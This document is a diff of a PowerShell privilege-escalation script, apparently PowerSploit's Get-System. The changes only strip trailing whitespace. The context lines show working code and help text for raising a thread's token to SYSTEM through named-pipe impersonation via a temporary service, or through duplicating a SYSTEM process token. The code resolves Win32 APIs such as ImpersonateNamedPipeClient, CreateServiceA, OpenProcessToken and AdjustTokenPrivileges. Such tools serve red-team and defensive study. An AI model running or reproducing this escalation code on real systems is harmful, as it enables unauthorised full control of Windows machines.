@@ -27,7 +27,7 @@ function Get-System {
         The name of the named pipe used with named pipe impersonation, defaults to 'TestSVC'.
 
     .PARAMETER RevToSelf
-    
+
         Reverts the current thread privileges.
 
     .PARAMETER WhoAmI
@@ -35,38 +35,38 @@ function Get-System {
         Switch. Display the credentials for the current PowerShell thread.
 
     .EXAMPLE
-        
+
         PS> Get-System
 
         Uses named impersonate to elevate the current thread token to SYSTEM.
 
     .EXAMPLE
-        
+
         PS> Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'
 
         Uses named impersonate to elevate the current thread token to SYSTEM
         with a custom service and pipe name.
 
     .EXAMPLE
-        
+
         PS> Get-System -Technique Token
 
         Uses token duplication to elevate the current thread token to SYSTEM.
 
     .EXAMPLE
-        
+
         PS> Get-System -WhoAmI
 
         Displays the credentials for the current thread.
 
     .EXAMPLE
-        
+
         PS> Get-System -RevToSelf
 
         Reverts the current thread privileges.
 
     .LINK
-    
+
         https://github.com/rapid7/meterpreter/blob/2a891a79001fc43cb25475cc43bced9449e7dc37/source/extensions/priv/server/elevate/namedpipe.c
         https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
         http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
@@ -105,11 +105,11 @@ function Get-System {
         Param
         (
             [OutputType([Type])]
-            
+
             [Parameter( Position = 0)]
             [Type[]]
             $Parameters = (New-Object Type[](0)),
-            
+
             [Parameter( Position = 1 )]
             [Type]
             $ReturnType = [Void]
@@ -124,7 +124,7 @@ function Get-System {
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
         Write-Output $TypeBuilder.CreateType()
     }
 
@@ -134,11 +134,11 @@ function Get-System {
         Param
         (
             [OutputType([IntPtr])]
-        
+
             [Parameter( Position = 0, Mandatory = $True )]
             [String]
             $Module,
-            
+
             [Parameter( Position = 1, Mandatory = $True )]
             [String]
             $Procedure
@@ -155,7 +155,7 @@ function Get-System {
         $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
         $tmpPtr = New-Object IntPtr
         $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
+
         # Return the address of the function
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
@@ -184,7 +184,7 @@ function Get-System {
         $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()
 
         # Declare/setup all the needed API function
-        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html 
+        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
         $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
         $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
         $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)
@@ -196,11 +196,11 @@ function Get-System {
         $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
         $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
         $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
-        
+
         $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
         $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
         $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)
-      
+
         $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
         $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
         $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)
@@ -292,8 +292,8 @@ function Get-System {
                     else{
                         Write-Verbose "Service successfully deleted"
                     }
-                
-                    # Step 7 - CloseServiceHandle() for the service handle 
+
+                    # Step 7 - CloseServiceHandle() for the service handle
                     Write-Verbose "Closing the service handle"
                     $val = $CloseServiceHandle.Invoke($ServiceHandle)
                     Write-Verbose "Service handle closed off"
@@ -452,7 +452,7 @@ function Get-System {
             @([IntPtr], [Bool], $TokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
             [Runtime.InteropServices.CallingConvention]::Winapi,
             'Auto').SetCustomAttribute($AttribBuilder)
-        
+
         $Win32Methods = $Win32TypeBuilder.CreateType()
 
         $Win32Native = [Int32].Assembly.GetTypes() | ? {$_.Name -eq 'Win32Native'}
@@ -460,7 +460,7 @@ function Get-System {
             'GetCurrentProcess',
             [Reflection.BindingFlags] 'NonPublic, Static'
         )
-            
+
         $SE_PRIVILEGE_ENABLED = 0x00000002
         $STANDARD_RIGHTS_REQUIRED = 0x000F0000
         $STANDARD_RIGHTS_READ = 0x00020000
@@ -503,7 +503,7 @@ function Get-System {
         if(-not($RetVal)) {
             Write-Error "AdjustTokenPrivileges failed, RetVal : $RetVal" -ErrorAction Stop
         }
-        
+
         $LocalSystemNTAccount = (New-Object -TypeName 'System.Security.Principal.SecurityIdentifier' -ArgumentList ([Security.Principal.WellKnownSidType]::'LocalSystemSid', $null)).Translate([Security.Principal.NTAccount]).Value
 
         $SystemHandle = Get-WmiObject -Class Win32_Process | ForEach-Object {
@@ -524,10 +524,10 @@ function Get-System {
             }
             catch {}
         } | Where-Object {$_ -and ($_ -ne 0)} | Select -First 1
-        
+
         if ((-not $SystemHandle) -or ($SystemHandle -eq 0)) {
             Write-Error 'Unable to obtain a handle to a system process.'
-        } 
+        }
         else {
             [IntPtr]$SystemToken = [IntPtr]::Zero
             $RetVal = $Win32Methods::OpenProcessToken(([IntPtr][Int] $SystemHandle), ($TOKEN_IMPERSONATE -bor $TOKEN_DUPLICATE), [ref]$SystemToken);$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
